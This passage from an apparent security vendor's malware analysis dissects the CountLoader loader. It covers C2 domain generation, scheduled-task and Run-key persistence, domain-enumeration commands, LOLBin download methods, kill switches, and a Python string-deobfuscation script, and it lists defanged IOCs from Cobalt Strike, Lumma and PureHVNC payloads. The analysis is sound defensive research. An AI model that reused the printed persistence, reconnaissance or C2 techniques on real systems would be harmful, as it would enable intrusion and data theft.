+<li>Generate a “Global Unique Identifier” from the Victim ID.</li>
+</ol>
+
+
+
+<p class="wp-block-paragraph">At the end of this process, CountLoader starts its main loop. The loop runs once and then continues to run as long as the “start” value is defined in the path of the HTA execution. This is the C2 contact attempt loop referenced previously, seen here in the following code:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1613" height="219" src="https://www.silentpush.com/wp-content/uploads/cloader-image-8-loop-code.png" alt="Screenshot of the loop code" class="wp-image-13899"/><figcaption class="wp-element-caption"><em>Screenshot of the loop code</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph"></p>
+
+
+
+<p class="wp-block-paragraph">This code does the following:<br>For each number between 1 and 10, generate a URL by:</p>
+
+
+
+<ol start="1" class="wp-block-list">
+<li>Taking “hxxps://<strong>ms-team-ping</strong>”</li>
+
+
+
+<li>Adding the number to the string (for example: hxxps://ms-team-ping<strong>10</strong>)</li>
+
+
+
+<li>Adding the .com tld (for instance: hxxps://ms-team-ping10<strong>.com</strong>)</li>
+
+
+
+<li>Then, checking to see if there is a legitimate response from the C2 server by using the function “CheckStatusC2ReturnDecryptedResponse”</li>
+</ol>
+
+
+
+<p class="wp-block-paragraph">The “CheckStatusC2ReturnDecryptedResponse” then creates an HTTP Post request to the C2 server with “CheckStatus” in the POST data.</p>
+
+
+
+<p class="wp-block-paragraph">If the C2 is up, it will respond with an XOR-encrypted and Base64-encoded string of “success”. The XOR encryption works as follows: The key consists of six characters from the string. The remaining string is the encrypted data. To decrypt, we take the six-character string and decrypt the remaining part. This algorithm is implemented in CountLoader as both an encryption and a decryption variant. The results of both are in Base64 encoding, presumably to maintain consistency.</p>
+
+
+
+<p class="wp-block-paragraph">All C2 comms are encrypted using this algorithm.</p>
+
+
+
+<p class="wp-block-paragraph">If CountLoader receives the “success” string from a C2, it then continues its main operation; otherwise, it jumps to attempting to contact the next C2 server.</p>
+
+
+
+<p class="wp-block-paragraph">The next step, connecting to the C2 server, is seen here:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1920" height="379" src="https://www.silentpush.com/wp-content/uploads/cloader-image-9-attempt-to-c2-server.png" alt="Screenshot of CountLoader attempting to connect to a C2 server" class="wp-image-13900"/><figcaption class="wp-element-caption"><em>CountLoader attempts to connect to a C2 server</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph">As seen above, CountLoader connects using the “/connect” endpoint, initially sending along some victim-specific fingerprint data. This request expects an encrypted response from the C2, where the response will be a long string and is then used as the C2’s password for the remainder of the communication. C2 authentication uses standard HTTP authentication with a Bearer header.</p>
+
+
+
+<p class="wp-block-paragraph">A sample encrypted response is:</p>
+
+
+
+<p class="wp-block-paragraph"><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGlmaWVyIjoiM0YwRDA</code><br><code>wREU0MUY0Q0ZGNURGNTNEQkY5M0IxMEYxNzciLCJleHAiOjE3NTIwNzc5MzcsIml</code><br><code>zcyI6IlNlcnZlciIsImF1ZCI6Ik15U2VydmVyQXVkaXQifQ.eU6qT6lRrS5iBCJP</code><br><code>eweOoH3fxiGLKjJEy5OTWZdYu5s</code></p>
+
+
+
+<p class="wp-block-paragraph">If the proper response is received, CountLoader creates a scheduled task to maintain persistence. This scheduled task runs the “mshta” executable pointing to “C2Server/env_Var.&lt;randomstringlength9)” ten minutes after the initial execution.</p>
+
+
+
+<p class="wp-block-paragraph">The name of the scheduled task is:</p>
+
+
+
+<ul class="wp-block-list">
+<li>&#8220;<strong>Google</strong>UpdaterTaskSystem135.0.7023.0&#8243; + vFlawedGUIDGen</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">The task name attempts to impersonate Google’s update tasks for the Chrome browser. CountLoader then checks if the scheduled task was successfully created. If not, it then checks to see if the initialization functionality has already been run.</p>
+
+
+
+<p class="wp-block-paragraph">If the initialization has not been run, the malware then executes the following code:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1920" height="191" src="https://www.silentpush.com/wp-content/uploads/cloader-image-10-next-step-malware-code.png" alt="Screenshot of the next step of the malware’s code" class="wp-image-13901"/><figcaption class="wp-element-caption"><em>Next step of the malware’s code</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph"></p>
+
+
+
+<p class="wp-block-paragraph">This first function call changes the registry value for “MaxScriptStatements” under:</p>
+
+
+
+<p class="wp-block-paragraph"><code>"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Styles\\";</code></p>
+
+
+
+<p class="wp-block-paragraph">to “10000000”.</p>
+
+
+
+<p class="wp-block-paragraph">This is likely an attempt to bypass warning messages thrown by MSHTA when long scripts are executed. Information related to these can be found <a href="https://superuser.com/questions/935212/would-this-registry-change-affect-you-or-your-users-negatively">on the SuperUser.com forums</a> and <a href="https://msfn.org/board/topic/147240-fantastic-internet-javascript-control-tweak-ie/">on the msfn.org forums</a>.</p>
+
+
+
+<p class="wp-block-paragraph">The malware then continues its execution by setting the Windows Run Key via:</p>
+
+
+
+<ul class="wp-block-list">
+<li>&#8220;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriver&#8221;</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">This process runs mshta.exe, reaching out to the C2 server under:</p>
+
+
+
+<ul class="wp-block-list">
+<li>MainC2ServerProtocolAndDomain + &#8220;/api/getFile/&#8221; + vLSEnv + &#8220;.hta/<strong>start</strong></li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">The process also executes the same command via WScript.Shell.</p>
+
+
+
+<p class="wp-block-paragraph">Note that these functions have the “<strong>/start</strong>&#8221; parameter explicitly added. At this point in CountLoader’s execution, we now have registry persistence consistently executing the latest script from the C2 server, after which it won’t run this part of the code again.</p>
+
+
+
+<p class="wp-block-paragraph">From here, we get to the actual “loader” part of the code: </p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1879" height="205" src="https://www.silentpush.com/wp-content/uploads/22-GetTasks.jpg" alt="CountLoader code example" class="wp-image-13933"/></figure>
+</div>
+
+
+<p class="wp-block-paragraph">The loader requests tasks from the C2 via a specific function: </p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1756" height="498" src="https://www.silentpush.com/wp-content/uploads/23-gettasksfromC2-1.jpg" alt="Example of Get Task from C2 code" class="wp-image-13934"/></figure>
+</div>
+
+
+<p class="wp-block-paragraph">It is important to note that a unique function is used here to set the previously received string from the connection phase to be the Authorization Bearer Header for this request.</p>
+
+
+
+<p class="wp-block-paragraph"><code>WinHTTP_Webrequest_5_1.SetRequestHeader("Authorization", "Bearer " + C2EndpointPW);</code></p>
+
+
+
+<p class="wp-block-paragraph">This function serves as an authentication measure, preventing unauthorized third parties from issuing successful requests to the C2 server.</p>
+
+
+
+<p class="wp-block-paragraph">The POST request data consists of “getUpdates”; i.e., the response text comes in a JSON format, containing an unknown number of tasks.</p>
+
+
+
+<p class="wp-block-paragraph">Each task consists of an ID, a URL (which, depending on the task, also contains comma-separated arguments needed for execution, such as the DLL entry point for DLL tasks), and a Task Type.</p>
+
+
+
+<p class="wp-block-paragraph">Here is an example we received for a domain-joined system:</p>
+
+
+
+<p class="wp-block-paragraph"><code>[{"id":123,"url":"","taskType":5},{"id":126,"url":"hxxps://ms-team-connect2[.]com/api/getFile/file2.exe","taskType":1}]</code></p>
+
+
+
+<p class="wp-block-paragraph">The available Task Types are:</p>
+
+
+
+<ul class="wp-block-list">
+<li>TaskType1: Download and Execute Task via Win32_Process.Create (WMI)</li>
+
+
+
+<li>TaskType3: Download and Execute using RunDLL32 (DLL execution)</li>
+
+
+
+<li>TaskType4: Delete Scheduled Task (stop execution)</li>
+
+
+
+<li>TaskType5: Query the local Windows domain and share system info with the C2. Commands are:
+<ul class="wp-block-list">
+<li>net group /domain</li>
+
+
+
+<li>systeminfo | find \”Domain”}</li>
+
+
+
+<li>net group \”Domain admins\” /DOMAIN</li>
+
+
+
+<li>net group \”Domain computers\” /DOMAIN</li>
+</ul>
+</li>
+
+
+
+<li>TaskType6: Download and Execute using msiexec (for MSI files)</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><em>Note: We can see “TaskType2” is missing. This may indicate that a previous CountLoader version containing it had it removed later.</em></p>
+
+
+
+<p class="wp-block-paragraph">All tasks that download external software to execute make use of a function that attempts the download via up to six different methods if the previous attempt did not succeed.</p>
+
+
+
+<p class="wp-block-paragraph">These methods are:</p>
+
+
+
+<ol start="1" class="wp-block-list">
+<li>Curl</li>
+
+
+
+<li>PowerShell Download command generator with XOR encryption and Base64 encoding</li>
+
+
+
+<li>MSXML2.XMLHTTP (Internet Explorer engine)</li>
+
+
+
+<li>WinHTTP.WinHttpRequest.5.1 (Windows HTTP API)</li>
+
+
+
+<li>Bitsadmin</li>
+
+
+
+<li>Certutil</li>
+</ol>
+
+
+
+<p class="wp-block-paragraph">By using LOLBins like “certutil” and “bitsadmin,” and by implementing an “on the fly” command encryption PowerShell generator, CountLoader’s developers demonstrate here an advanced understanding of the Windows operating system and malware development.</p>
+
+
+
+<p class="wp-block-paragraph">Additionally, our team observed CountLoader makes almost exclusive use of its victims&#8217; “Music” folder to stage additional malware binary downloads. This folder is commonly observed as a staging folder, as it is more accessible for many users compared to other traditional staging folders like the “Temp” data folder or the “AppData” folder. This observation plays a role in our attribution assessment later on.</p>
+
+
+
+<p class="wp-block-paragraph">Every successfully downloaded and executed task is shared to the C2 via this function: </p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1359" height="301" src="https://www.silentpush.com/wp-content/uploads/21-ApproveUpdates.jpg" alt="Approved update code" class="wp-image-13931"/></figure>
+</div>
+
+
+<p class="wp-block-paragraph">The task ID from previous steps is then used as part of the HTTP POST data (approveUpdate?<strong>id=&lt;id of task&gt;</strong>) to confirm successful execution. Notably, the initial C2 password is used here again for authentication.</p>
+
+
+
+<p class="wp-block-paragraph">After executing all tasks from the C2 server, the main loop starts again, so long as the “<strong>/start</strong>” variable is in the execution path.</p>
+
+
+
+<p class="wp-block-paragraph">Finally, on encountering errors of any sort, the script deletes itself.</p>
+
+
+
+<h2 class="wp-block-heading" id="Analysis-of-CountLoader’s-.NET-Version">Analysis of CountLoader Malware Loader’s .NET Version</h2>
+
+
+
+<p class="wp-block-paragraph">While investigating the C2 domain <em><strong>ms-team-ping 2[.]com</strong></em>, our team discovered the endpoint that receives binaries from tasks was configured as:</p>
+
+
+
+<ul class="wp-block-list">
+<li>/api/getFile?fn=&lt;filename&gt;</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">Following this pattern, we were able to extract a .NET version of CountLoader, among other payloads. This .NET binary, named <em><strong>twitter1[.]exe</strong></em>, has a SHA-256 hash of “17bfe335b2f9037849fda87ae0a7909921a96d8abfafa8111dc5da63cbf11eda”.</p>
+
+
+
+<p class="wp-block-paragraph">Looking deeper, the binary presented the following metadata information, among others:</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Core Assembly Info:</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li><strong>AssemblyTitle</strong>: &#8220;HyperDrive OS&#8221; &#8211; the name of the application</li>
+
+
+
+<li><strong>AssemblyDescription</strong>: &#8220;High-performance cloud-based software&#8221;</li>
+
+
+
+<li><strong>AssemblyCompany</strong>: &#8220;OmniTech Industries&#8221; &#8211; the company that created it</li>
+
+
+
+<li><strong>AssemblyProduct</strong>: &#8220;HyperDrive OS&#8221;</li>
+
+
+
+<li><strong>AssemblyCopyright</strong>: &#8220;© 2024 FutureSoft. Unauthorized reproduction prohibited.&#8221;</li>
+
+
+
+<li><strong>AssemblyTrademark</strong>: &#8220;CodeFusion™&#8221;</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">The “Assembly” metadata here refers to two different companies, “OmniTech Industries” and “FutureSof.” We observed no public correlation between the two, and it appears these could simply be details added by the threat actors to obfuscate their work.</p>
+
+
+
+<p class="wp-block-paragraph">Fortunately for our team, the packer used for CountLoader here appears to have been used solely for binding additional libraries to the binary related to handling compressed archive files. As such, the code itself is relatively easy to read, the main function of which can be seen below:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1920" height="1030" src="https://www.silentpush.com/wp-content/uploads/cloader-image-11-primary-function.png" alt="Screenshot of the primary function" class="wp-image-13902"/><figcaption class="wp-element-caption"><em>Screenshot of the primary function</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph"></p>
+
+
+
+<p class="wp-block-paragraph">In the .NET version of CountLoader, some crossover artifacts stand out from the JScript version.</p>
+
+
+
+<p class="wp-block-paragraph">First, the C2 connection appears to be established through an API Client that utilizes functions named: Connect(), GetUpdates(), and SubmitUpdate(update.ID). This aligns perfectly with the three functions observed in the JScript-based CountLoader version.</p>
+
+
+
+<p class="wp-block-paragraph">Additionally, there is an iterative process to read and execute all tasks received by the C2; and a web request to the C2 acknowledges every task. Once again, this aligns with the JScript version.</p>
+
+
+
+<p class="wp-block-paragraph">A notable difference between them, however, is that the observed .NET version of CountLoader only supports two types of commands, UpdateType.Zip or UpdateType.Exe. This indicates a reduced functionality set compared to the previously analyzed JScript version.</p>
+
+
+
+<p class="wp-block-paragraph">Interestingly, there is also a kill switch function at the very beginning of the .NET version, which, after cleanup and some additional math, looks like the following:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1143" height="258" src="https://www.silentpush.com/wp-content/uploads/20-mains.jpg" alt="Screenshot of public static main code" class="wp-image-13930"/></figure>
+</div>
+
+
+<p class="wp-block-paragraph">On execution, the binary calculates a hardcoded timestamp of May 12, 2025. It then checks if that date has passed by comparing the device date against this hardcoded timestamp. If the date has passed, then the code will attempt to divide 1 by 0, crashing the program. It will do this silently as well, as the loop catches all related errors and suppresses output to the user, effectively stopping the binary from executing.</p>
+
+
+
+<p class="wp-block-paragraph">Alternative versions of the kill switch check are executed several times throughout the sample.</p>
+
+
+
+<p class="wp-block-paragraph">We also see a custom string obfuscation function:</p>
+
+
+
+<p class="wp-block-paragraph"><code>ar.a( obfuscated_string, int)</code></p>
+
+
+
+<p class="wp-block-paragraph">Reversing the string obfuscation allowed us to understand the sample better. The source code of the Augmented Reality (AR) class, for example, can be seen below:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1920" height="1152" src="https://www.silentpush.com/wp-content/uploads/cloader-image-12-source-code-ar-class.png" alt="Screenshot of the source code of the AR class" class="wp-image-13903"/><figcaption class="wp-element-caption"><em>The source code of the AR class</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph"></p>
+
+
+
+<p class="wp-block-paragraph">The first function here, called for string deobfuscation, is actually another kill switch.</p>
+
+
+
+<p class="wp-block-paragraph">We can see that it creates a new DateTime Object with a predefined date. However, this date is intentionally obfuscated via a few different calculations. Cleaning that up, we get the following:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1245" height="334" src="https://www.silentpush.com/wp-content/uploads/19-deathswitch.jpg" alt="Death switch code screenshot" class="wp-image-13929"/></figure>
+</div>
+
+
+<p class="wp-block-paragraph">All told, this function compares the hardcoded date: May 12, 2025, at 11:00:16 PM against the current date and, again, initiates a crash by dividing by 0 if the required parameter is not met.</p>
+
+
+
+<p class="wp-block-paragraph">However, just prior, the code continues deobfuscating the string:</p>
+
+
+
+<p class="wp-block-paragraph"><code>return ar.b.b.c(a, b)</code></p>
+
+
+
+<p class="wp-block-paragraph">Looking at the remaining code in the AR class, we see that this execution chain first loads a resource from the binary itself. This resource has a random name, which comes in obfuscated form via the b() function. In the case of our sample, this encrypted resource’s name is &#8220;<strong>+;\u0016\b1</strong>&#8220;.</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1489" height="331" src="https://www.silentpush.com/wp-content/uploads/18-strinbg.jpg" alt="Screenshot of b code" class="wp-image-13928"/></figure>
+</div>
+
+
+<p class="wp-block-paragraph">The b() function decrypts the name of the resource using more math, which we can see the various steps of below:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="987" height="526" src="https://www.silentpush.com/wp-content/uploads/24-originalformat-1.jpg" alt="Example of original format code" class="wp-image-13935"/></figure>
+</div>
+
+
+<p class="wp-block-paragraph">The “decrypted resource name” of “<strong>vfKUl</strong>”, shown above, can be found in the binary in a specific byte array:</p>
+
+
+
+<p class="wp-block-paragraph"><code>[0x90, 0xAE, 0x48, 0x60, 0xD8, 0xFD, 0x70, 0xDF, 0xF1, 0x6E, 0x8C, 0x04, 0x6B, 0xCB, 0x39, 0x18]</code></p>
+
+
+
+<p class="wp-block-paragraph">These bytes act as a key table for the deobfuscation of the string. As seen initially, each string is also passed alongside an integer. The lower 4 bits of that integer are used to determine which of the 16 keys from the array to choose. Then a logical “OR” operation is used to generate the XOR key, a logical representation of which is shown here:</p>
+
+
+
+<p class="wp-block-paragraph"><code>&lt;ressourcekey&gt; | integer = &lt;key&gt;</code></p>
+
+
+
+<p class="wp-block-paragraph">This key is then XORed with every character of the obfuscated string.</p>
+
+
+
+<p class="wp-block-paragraph">Below, our team demonstrates this with an example string from the binary:</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Setup</strong>:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Input string: <code>'\ue8f0\ue8be\ue8af\ue8b6\ue8f0\ue8be\ue8af\ue8af\ue8ad\ue8b0\ue8a9</code><br><code>\ue8ba\ue88a\ue8af\ue8bb\ue8be\ue8ab\ue8ba\ue8e0\ue8b6\ue8bb\ue8e2'</code></li>
+
+
+
+<li>Key integer: <strong>59479</strong></li>
+
+
+
+<li>String converted to char array, length = 22</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Key calculation</strong>:</p>
+
+
+
+<ul class="wp-block-list">
+<li><strong>59479 &amp; 0xF = 7 </strong>(takes lower 4 bits)</li>
+
+
+
+<li><strong>m_c[7] = 0xDF</strong> (byte from resource at index 7)</li>
+
+
+
+<li><strong>0xDF | 59479 = 0xE8DF</strong> (59615) &#8211; this becomes the XOR key</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Decryption loop</strong> (processes characters in reverse order):</p>
+
+
+
+<ul class="wp-block-list">
+<li>For each character: <strong>char = char ^ 0xE8DF</strong></li>
+
+
+
+<li>Example: <strong>&#8216;\ue8f0&#8217; ^ 0xE8DF = &#8216;/&#8217;</strong></li>
+
+
+
+<li>Each encrypted character gets XORed with the same key <strong>0xE8DF</strong></li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Result</strong>:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Returns new string: <strong>&#8220;/api/approveUpdate?id=&#8221;</strong></li>
+
+
+
+<li>Length remains 22 characters</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">To facilitate the string’s deobfuscation, our team wrote a quick Python script, shown below:</p>
+
+
+
+<p class="wp-block-paragraph"><code>def decrypt_ar_string(encrypted_string, key_index): """ Decrypt a string using the ar.a() method logic Args: encrypted_string: The encrypted string to decrypt key_index: The integer key index used in encryption Returns: Decrypted string """ # The key table from the vfKUl resource key_table = [0x90, 0xAE, 0x48, 0x60, 0xD8, 0xFD, 0x70, 0xDF, 0xF1, 0x6E, 0x8C, 0x04, 0x6B, 0xCB, 0x39, 0x18] # Calculate the XOR key table_byte = key_table[key_index &amp; 0xF] xor_key = table_byte | key_index # Decrypt the string (working backwards like the original) chars = list(encrypted_string) for i in range(len(chars) - 1, -1, -1): chars[i] = chr(ord(chars[i]) ^ xor_key) return ''.join(chars) # ============================================================================= # ADD YOUR ENCRYPTED STRINGS HERE # Format: (encrypted_string, key_index) # ============================================================================= encrypted_strings = [ # Example - replace with your actual encrypted strings ("\ue8f0\ue8be\ue8af\ue8b6\ue8f0\ue8be\ue8af\ue8af\ue8ad\ue8b0\ue8a9\ue8ba\ue88a</code><br><code>\ue8af\ue8bb\ue8be\ue8ab\ue8ba\ue8e0\ue8b6\ue8bb\ue8e2", 59479), # Add more encrypted strings here like: ] # ============================================================================= # DECRYPTION RESULTS # ============================================================================= print("=" * 80) print("DECRYPTION RESULTS") print("=" * 80) for i, (encrypted, key_idx) in enumerate(encrypted_strings): print(f"\n[{i+1}] Encrypted: {repr(encrypted)}") print(f" Key index: {key_idx}") print(f" Key index &amp; 0xF: {key_idx &amp; 0xF}") # Calculate XOR key details table_byte = [0x90, 0xAE, 0x48, 0x60, 0xD8, 0xFD, 0x70, 0xDF, 0xF1, 0x6E, 0x8C, 0x04, 0x6B, 0xCB, 0x39, 0x18][key_idx &amp; 0xF] xor_key = table_byte | key_idx print(f" Table byte: 0x{table_byte:02X}") print(f" XOR key: 0x{xor_key:04X} ({xor_key})") # Decrypt and show result decrypted = decrypt_ar_string(encrypted, key_idx) print(f" DECRYPTED: '{decrypted}'") # Show length info print(f" Length: {len(encrypted)} chars -&gt; {len(decrypted)} chars") print("\n" + "=" * 80) print("SUMMARY - DECRYPTED STRINGS ONLY") print("=" * 80)</code></p>
+
+
+
+<p class="wp-block-paragraph">Using this script, we can now deobfuscate all strings in the binary, which allows us to show the fully deobfuscated main function:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1920" height="1374" src="https://www.silentpush.com/wp-content/uploads/cloader-image-13-nets-fully-deob-main-function.png" alt="Screenshot of CountLoader’s .NET version’s fully deobfuscated main function" class="wp-image-13904"/><figcaption class="wp-element-caption"><em>Screenshot of CountLoader’s .NET version’s fully deobfuscated main function</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph"></p>
+
+
+
+<p class="wp-block-paragraph">An interesting observation that can be made here is the hardcoded User-Agent header, which indicates a Yandex browser on Windows 10. Yandex is a Russian company sometimes referred to as “Russia’s Google.” This appears to be an additional hint at an Eastern European or Russian developer.</p>
+
+
+
+<p class="wp-block-paragraph">As with the JScript loader, if the binary crashes or completes its process<a href="https://securelist.com/browservenom-mimicks-deepseek-to-use-malicious-proxy/115728/">,</a> it will delete itself from the disk and kill its own process, effectively removing artifacts of its infection:</p>
+
+
+
+<p class="wp-block-paragraph"><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 YaBrowser/24.12.0.0 Safari/537.36</code></p>
+
+
+
+<h2 class="wp-block-heading" id="CountLoader-PowerShell-Version">CountLoader PowerShell Version</h2>
+
+
+
+<p class="wp-block-paragraph">The PowerShell version on CountLoader that we observed is even more straightforward than the .NET binary. In fact, the only sample we observed consisted of a mere 20 lines of code.</p>
+
+
+
+<p class="wp-block-paragraph">Since this version of CountLoader has already been analyzed in the <a href="https://securelist.com/browservenom-mimicks-deepseek-to-use-malicious-proxy/115728/">Kaspersky SecureList article</a>, we will only briefly highlight the similarities with the JScript and .NET variants.</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="946" height="443" src="https://www.silentpush.com/wp-content/uploads/cloader-image-14-securelist-article.png" alt="Screenshot from the SecureList article" class="wp-image-13905"/><figcaption class="wp-element-caption"><em>Screenshot from the SecureList article</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph"></p>
+
+
+
+<p class="wp-block-paragraph">As seen with the previous samples, here CountLoader uses a loop to generate C2 domains. It also stores the received malware binary in the Music folder. Additionally, it uses a known CountLoader C2 domain, <em><strong>app-updater[.]app</strong></em>.</p>
+
+
+
+<p class="wp-block-paragraph">It even features two different ways to execute received code: by either storing it on disk and running it via “Start-Process,” or by using in-memory execution via reflective loading.</p>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+
+
+<h2 class="wp-block-heading" id="CountLoader-Payload-Analysis">CountLoader Payload Analysis</h2>
+
+
+
+<p class="wp-block-paragraph">To gain a deeper understanding of the malware delivered by CountLoader, we developed an in-house emulator to request Tasks from its C2 servers.</p>
+
+
+
+<p class="wp-block-paragraph">Over the span of two weeks, our team received the following samples directly from the attacker&#8217;s own infrastructure.<br></p>
+
+
+
+<figure class="wp-block-table"><table class="has-fixed-layout"><tbody><tr><th><strong>Filename</strong></th><th><strong>Sha256</strong></th><th><strong>Malware</strong></th><th><strong>C2 Server</strong></th></tr><tr><td>file2[.]exe</td><td>233C777937F3B0F83B1F6AE47403E03D1C3F72F650B4C6AE3FACEC7F2E5DA4B5</td><td>Cobalt Strike</td><td>hxxp[:]//64[.]137[.]9[.]118/__utm[.]gif</td></tr><tr><td>file[.]exe</td><td>5e9647e36d2fb46f359036381865efb0e432ff252fae138682cb2da060672c84</td><td>Cobalt Strike</td><td>hxxp[:]//64[.]137[.]9[.]118/__utm[.]gif</td></tr><tr><td>file_x64[.]exe</td><td>8A286A315DBA36B13E61B6A3458A4BB3ACB7818F1E957E0892A35ABB37FC9FCE</td><td>Cobalt Strike Shellcode Loader</td><td>64[.]137[.]9[.]118[:]80/SQWb</td></tr><tr><td>&lt;in memory implant&gt;</td><td>&lt;injected into previous sample&gt;</td><td>Cobalt Strike</td><td>hxxp[:]//64[.]137[.]9[.]118/dpixel</td></tr><tr><td>run_v2[.]exe</td><td>EA410874356E7D27867A4E423F1A818AAEA495DFBF068243745C27B80DA84FAE</td><td>Adaptix C2</td><td>hxxps[:]//64[.]137[.]9[.]118/api</td></tr><tr><td>run_v4[.]exe</td><td>B86ADCF7B5B8A6E01C48D2C84722919DF2D1C613410C32EB43FC8C10B8158C45</td><td>Adaptix C2</td><td>hxxps[:]//64[.]137[.]9[.]118/api</td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">All samples mentioned above were only received by Windows domain-joined systems. All domain-joined systems also received “Task Type 5” for the JScript CountLoader version, which asked for additional Windows domain information.</p>
+
+
+
+<p class="wp-block-paragraph">This shows the threat actor’s higher interest in domain-joined systems, which is understandable as they typically indicate a corporate environment.</p>
+
+
+
+<p class="wp-block-paragraph">Also noteworthy, though for a non-domain-joined system this time, our team’s emulator received a packed PureHVNC payload:<br></p>
+
+
+
+<figure class="wp-block-table"><table class="has-fixed-layout"><tbody><tr><th><strong>Filename</strong></th><th><strong>Sha256</strong></th><th><strong>Malware</strong></th><th><strong>C2 Server</strong></th></tr><tr><td>cvcshost[.]exexexpierience[.]exeXojwecqy[.]exe</td><td>D34CA886266B7CE5F75F4CAAA6E48F61E194BB55605C2BC4032BA8AF5580B2E7</td><td>PureHVNC</td><td>109[.]176[.]30[.]246[:]56004Ports: 56001 &#8211; 56004</td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">The PureHVNC binary was downloaded from the following link:</p>
+
+
+
+<p class="wp-block-paragraph"><code>hxxps[:]//chifacanton[.]phuyufact[.]com/images/sot/e/Xojwecqy[.]exe</code></p>
+
+
+
+<p class="wp-block-paragraph">Once dropped, it is renamed to both <em><strong>cvcshost[.]exe</strong></em> and <em><strong>xespierience[.]exe</strong></em> during the unpacking and execution steps.</p>
+
+
+
+<p class="wp-block-paragraph">Another binary staged on this server is:</p>
+
+
+
+<p class="wp-block-paragraph"><code>hxxps[:]//chifacanton[.]phuyufact[.]com/images/sot/m/git[.]msi</code></p>
+
+
+
+<p class="wp-block-paragraph">The SHA256 of which is:</p>
+
+
+
+<p class="wp-block-paragraph"><code>4CB6EC9522D8C1315CD3A2985D2204C634EDC579B08A1B132254BD7DD5DF72D8</code></p>
+
+
+
+<p class="wp-block-paragraph">Which, upon further analysis, turned out to be Lumma Stealer with the following C2 server:</p>
+
+
+
+<p class="wp-block-paragraph"><code>gizqt[.]xyz</code></p>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+
+
+<h2 class="wp-block-heading" id="The-Ransomware/IAB-Connection">The Ransomware/IAB Connection</h2>
+
+
+
+<p class="wp-block-paragraph">During our Analysis of the various Cobalt Strike samples related to this campaign, our team successfully extracted an associated C2 configuration from within the malware’s binary.</p>
+
+
+
+<p class="wp-block-paragraph">The fields captured from it included a “<strong>watermark</strong>” field, along with an “<strong>http_hosts</strong>” field, which contained an IP address, as explained further below:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1504" height="562" src="https://www.silentpush.com/wp-content/uploads/cloader-image-15-watermark-captured.png" alt="Screenshot of the fields captured included the “watermark” and “http_hosts” fields" class="wp-image-13906"/><figcaption class="wp-element-caption"><em>The fields captured included the “watermark” and “http_hosts” fields</em></figcaption></figure>
+</div>
+
+
+<h3 class="wp-block-heading" id="h-detection-of-a-crucial-element">Detection of a Crucial Element</h3>
+
+
+
+<p class="wp-block-paragraph">Among the various configuration options used by this threat actor in their deployment of Cobalt Strike, one crucial element is the Cobalt Strike watermark. Cobalt Strike watermarks are unique numerical values generated from the Cobalt Strike license file. This value is added to each full backdoor beacon payload generated by a particular Cobalt Strike C2 instance.</p>
+
+
+
+<p class="wp-block-paragraph">There are only a few cases where this watermark cannot be tied to a unique attacker. This can be the case in cracked versions of Cobalt Strike or when an attacker shares their Cobalt Strike license file with another attacker.</p>
+
+
+
+<p class="wp-block-paragraph">In most cases, however, the Cobalt Strike watermark is a unique enough identifier that it enables researchers to cluster different campaigns together and tie them back to a single cluster.</p>
+
+
+
+<p class="wp-block-paragraph">Our team observed the following watermark tied to the Cobalt Strike samples spread via CountLoader: <strong>1473793097</strong>. We uncovered two different Cobalt Strike samples containing this watermark, each configured with its own C2 server.</p>
+
+
+
